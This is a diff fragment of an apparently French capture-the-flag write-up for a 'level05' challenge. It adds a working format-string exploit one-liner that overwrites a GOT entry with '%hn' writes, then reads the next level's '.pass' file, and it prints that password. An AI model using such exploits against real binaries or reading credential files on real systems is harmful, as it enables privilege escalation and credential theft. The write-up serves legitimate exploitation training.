@@ -81,4 +81,6 @@ Nous voyons donc que notre argument est en 10eme position dans la stack. Donc no
 
 ```bash
 (python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55467d%10$hn" + "%10060d%11$hn"' ; cat) | ./level05
+cat /home/users/level06/.pass
+h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
 ```
